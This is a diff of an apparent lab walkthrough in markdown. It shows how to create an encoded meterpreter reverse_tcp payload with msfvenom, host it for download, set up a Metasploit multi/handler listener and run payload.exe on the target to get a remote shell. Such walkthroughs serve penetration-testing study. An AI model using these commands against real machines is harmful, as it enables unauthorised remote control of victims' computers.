@@ -95,11 +95,49 @@ msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -o payl
 
 In this case i created a meterpreter .exe payload encoded with shikata_ga_nai.
 
-To upload this payload to the target machine we need once again to host this file in a http server:
+To upload this payload to the target machine we need once again to host this file in a SimpleHTTPServer:
 
 ![image](https://user-images.githubusercontent.com/76821053/131248806-8c6499d4-59d5-43bc-b641-eb9b2fa93b30.png)
 
-From the target machine we can donwload it with this powershell command:
+From the target machine we can request it with this powershell command:
 
-![image](https://user-images.githubusercontent.com/76821053/131248827-2a8bce17-1a89-454f-9763-41075d0aa7a1.png)
+![image](https://user-images.githubusercontent.com/76821053/131248869-353d8387-5417-47f7-a09c-51b318e122e4.png)
+
+Now that we have the payload ready we need to start a meterpreter listener. So we are going to fire up metasploit.
+
+We need to change some parameters to match our payload, ip address and port:
+
+```
+use multi/handler  → Choose exploit, in this case a listener
+
+set payload windows/meterpreter/reverse_tcp  →  Set the same payload used in the our msfvenom payload
+
+set LHOST your_ip_address  →  Choose your ip address
+
+set LPORT payload_chosen_port  → Choose the same port has the payload that we created with msfvenom
+
+options  →  To list all the available options
+
+run  →  To start the listener
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131249057-b7e4e405-8711-4645-887c-04ef0d547e59.png)
+
+On the target machine we just have to run the payload.exe file:
+
+```
+.\payload.exe 
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131249240-10687032-47d2-4c79-a18d-dd7dc907934a.png)
+
+Moments after we got a shell on the meterpreter session:
+
+![image](https://user-images.githubusercontent.com/76821053/131249265-80c1e8fb-2b93-49ee-883b-9b56e565f3c6.png)
+
+
+
+
+
+
 
